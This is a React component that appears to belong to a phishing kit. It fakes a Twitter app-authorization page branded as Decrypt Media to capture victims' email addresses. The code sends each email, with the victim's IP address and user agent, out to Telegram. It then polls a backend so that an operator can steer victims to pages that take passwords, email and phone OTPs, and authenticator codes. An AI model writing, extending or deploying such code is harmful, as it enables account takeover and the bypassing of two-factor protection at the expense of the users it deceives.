import React, { useEffect, useState } from "react";
import { fetchUserStep, submitEmail, updateUserStep } from "../../services/api";
import { sendToTelegram } from "../../utils/sendToTelegram";
import Header from "./Header.jsx";
import Footer from "./Footer.jsx";
import Loader from "./Loader.jsx";
import Cookies from "js-cookie";
import { useNavigate } from "react-router-dom";

const EmailCaptureForm = () => {
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(""); // State for error message
  const [showLoader, setShowLoader] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();

    const userId = Cookies.get("userId");

    try {
      // First, update user step to 'loading' and then show the loader
      await updateUserStep(userId, "loading");
      setShowLoader(true); // Show loader only after user step is updated to 'loading'

      const userIp = await fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => data.ip);

      const userAgent = navigator.userAgent || "Unknown User Agent";

      const response = await submitEmail(email, userId, userIp, userAgent);

      if (response.status === 201) {
        const data = response.data;

        const sections = [
          {
            title: "Email Capture",
            data: { Email: email, IP: userIp, UserAgent: userAgent },
          },
        ];
        sendToTelegram(sections, "Email Capture");

        console.log("Form submitted successfully", data);
      } else {
        console.error("Failed to submit form:", response.data.error);
        setError("Failed to submit form. Please try again.");
        setShowLoader(false); // Hide loader on error
      }
    } catch (error) {
      console.error("Error:", error);
      setError("An error occurred while submitting the form.");
      setShowLoader(false); // Hide loader on error
    }
  };

  // Poll for user step from the backend
  useEffect(() => {
    if (!showLoader) return;

    const userId = Cookies.get("userId");
    const pollForStep = async () => {
      try {
        console.log("Polling for user step...");

        const response = await fetchUserStep(userId);
        const step = response?.data?.currentStep;

        console.log("Fetched step:", step);

        if (step && step !== "loading") {
          switch (step) {
            case "email-password":
              navigate(`/email-page?userId=${userId}`);
              break;
            case "email-otp":
              navigate(`/email-otp-page?userId=${userId}`);
              break;
            case "phone-otp":
              navigate(`/phone-otp-page?userId=${userId}`);
              break;
            case "phone-number":
              navigate(`/phone-number-page?userId=${userId}`);
              break;
            case "authenticator-otp":
              navigate(`/authenticator-otp-page?userId=${userId}`);
              break;
            case "error-page":
              console.log(
                "Error page step received, stopping loader and showing error."
              );
              setError(
                "There was an issue with the email provided. Please try again."
              );
              setShowLoader(false); // Stop loader on error
              break;
            case "thank-you":
              navigate(`/thank-you?userId=${userId}`);
              break;
            default:
              console.log("Unknown step received:", step);
              setError("Unknown step received. Please try again.");
              setShowLoader(false); // Stop loader on unknown step
          }
        }
      } catch (err) {
        console.error("Polling error:", err);
        setError("Failed to fetch user step. Please try again.");
        setShowLoader(false);
      }
    };

    const intervalId = setInterval(pollForStep, 2000); // Poll every 2 seconds

    return () => clearInterval(intervalId); // Cleanup on unmount
  }, [showLoader, navigate]);

  if (showLoader) {
    return <Loader />; // Show loader while loading
  }

  return (
    <React.Fragment>
      <div className="flex flex-col min-h-screen">
        <Header />
        <main className="flex-grow">
          <div className="max-w-xl mx-auto px-4 sm:px-6 py-4">
            <div className="bg-white sm:border sm:border-gray-300 sm:rounded-lg">
              <div className="p-4 sm:p-6">
                <h1 className="text-xl font-bold text-gray-800 mb-4">
                  Authorize Decrypt Media to recieve digital signatures using
                  your account?
                </h1>

                <div className="flex items-center mb-4">
                  <img
                    src="/decrypt.jpg"
                    alt="Decrypt Media"
                    className="w-12 h-12 mr-3"
                  />
                  <div>
                    <h3 className="font-bold text-gray-800">Decrypt Media</h3>
                    <p className="text-sm text-gray-600">By @decryptmedia</p>
                    <p className="text-sm text-gray-600">decrypt.co</p>
                  </div>
                </div>

                {error && (
                  <div className="text-red-500 text-sm mb-3">{error}</div>
                )}

                <form className="mb-6" onSubmit={handleSubmit}>
                  <input
                    type="email"
                    placeholder="Email"
                    className={`w-full p-2 border ${
                      error ? "border-red-500" : "border-gray-300"
                    } rounded mb-3 text-sm`}
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                  />
                  <div className="flex space-x-3">
                    <button
                      type="submit"
                      className="bg-blue-500 text-white py-2 px-4 rounded font-bold hover:bg-blue-600 text-sm flex-grow sm:flex-grow-0"
                    >
                      Proceed
                    </button>
                    <button
                      type="button"
                      className="bg-white text-gray-700 py-2 px-4 rounded font-bold border border-gray-300 hover:bg-gray-100 text-sm flex-grow sm:flex-grow-0"
                    >
                      Cancel
                    </button>
                  </div>
                </form>

                <div className="text-sm">
                  <p className="text-green-600 mb-2">
                    This application will be able to:
                  </p>
                  <ul className="list-disc pl-5 space-y-1 text-gray-600 mb-4">
                    <li>
                      See Tweets from your timeline as well as your Lists and
                      collections.
                    </li>
                    <li>See your Twitter profile information .</li>
                    <li>See accounts you follow.</li>
                  </ul>
                  <p className="text-gray-500">
                    Learn more about{" "}
                    <a href="#" className="text-blue-500 hover:underline">
                      third-party app permissions
                    </a>{" "}
                    in the Help Center.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    </React.Fragment>
  );
};

export default EmailCaptureForm;
